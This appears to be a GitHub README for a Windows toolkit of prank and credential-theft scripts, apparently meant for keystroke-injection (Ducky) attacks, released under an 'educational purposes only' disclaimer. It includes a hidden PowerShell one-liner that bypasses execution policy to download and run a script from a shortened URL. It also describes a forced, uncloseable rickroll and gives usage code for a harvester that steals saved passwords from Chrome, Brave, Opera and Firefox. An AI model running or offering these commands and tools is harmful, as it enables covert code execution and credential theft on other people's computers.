> **Disclaimer** \
> This project shall be used for **educational purposes only** \
> I (the author) take no responsibility or liability related to its usage.
> Any illegal activities are strictly forbidden.


## Tools

> **Note** \
> all tools target and have been tested for Windows

#### Urlshortener
Shortens an url with only "safe" characters for the domain [is.gd](https://is.gd)

<details>
<summary>Details</summary>

file: [urlshortener.py](urlshortener.py) \
Characters considered "safe" for keyboards are:
```
    t uiop
asdfghjkl
 xcvbnm
```
[![img.png](assets/keyboard_layouts.png)](https://www.quora.com/What-are-the-most-common-keyboard-layouts-And-why-is-each-layout-designed-as-such)
(from [quora](https://www.quora.com/What-are-the-most-common-keyboard-layouts-And-why-is-each-layout-designed-as-such))

### requirements
```shell
pip install --upgrade aiohttp
```

### usage
```shell
python urlshortener.py 
# https://is.gd/tuion
```
or
```python
import asyncio
from urlshortener import create_short

async def main():
    url = "https://kaliiiiiiiiii.github.io/rickroll"
    _range = range(5, 10) # range to find urls for
    shorturl = await create_short(url, _range)
    print(shorturl)

if __name__ == "__main__":
    asyncio.run(main())
```

</details>

#### Rickroll (powershell)
- opens MS Edge on url
- sets audio volume to max
- user can't close it
- exits after `n` seconds

<details>
<summary>Details</summary>

file: [rickroll.ps1](rickroll.ps1)

### usage
```shell
powershell -w h -ep ByPass "IEX(iwr('is.gd/tuipo'))"
```
(download from this repo) \
or
```shell
powershell ./rickroll.ps1
```

### configuration
You can change the `url` and `timeout` at [L96-L98](rickroll.ps1#L96-L98)

To create a short direct url to the file, run (replace `YourUserName` accordingly)
```shell
python urlshortener.py "https://raw.githubusercontent.com/YourUserName/PublicDuckyChallenger/master/rickroll.ps1"
```

### Troubleshooting
If for some reason, you can't see your desktop anymore, perform the following steps:
1. press `CTRL` + `SHIFT` + `ESC`
2. click on `File`-> `Run New Task` in the Task-Manager
3. type `explorer` and press `ENTER`
4. 
</details>

#### Password harvester
Steal all available passwords from Opera, Brave, Chrome and Firefox

<details>
<summary>Details</summary>

file: [pass_harvester/password_harvester.py](pass_harvester/password_harvester.py) (requires [firefox_harvester.py](pass_harvester/firefox_harvester.py))

### requirements
```shell
pip install --upgrade aiosqlite pywin32 pycryptodome aiofiles
```

### Usage
```shell
python  ./pass_harvester/password_harvester.py
```
or
```python
import asyncio
from pass_harvester.password_harvester import get_all_creds

async def main():
    all_creds = await get_all_creds()
    # note: creds can contain binary
    print(all_creds)

if __name__ == "__main__":
    asyncio.run(main())
```

</details>

## Acknowledgments
Inspiration, code snippets, etc.

[neonfury/extract.py (gist)](https://gist.github.com/neonfury/a34a2aadc7c084f08cb046728cd25b54#file-extract-py) | password extractor for Chromium based browsers \
[foxtonforensics.com/blog/post/analysing-chrome-login-data](https://www.foxtonforensics.com/blog/post/analysing-chrome-login-data) \
[unode/firefox_decrypt/firefox_decrypt.py](https://github.com/unode/firefox_decrypt/blob/2a163faf6c22f62eb0b061fa3c0b317ae2e4a343/firefox_decrypt.py) | password extractor for firefox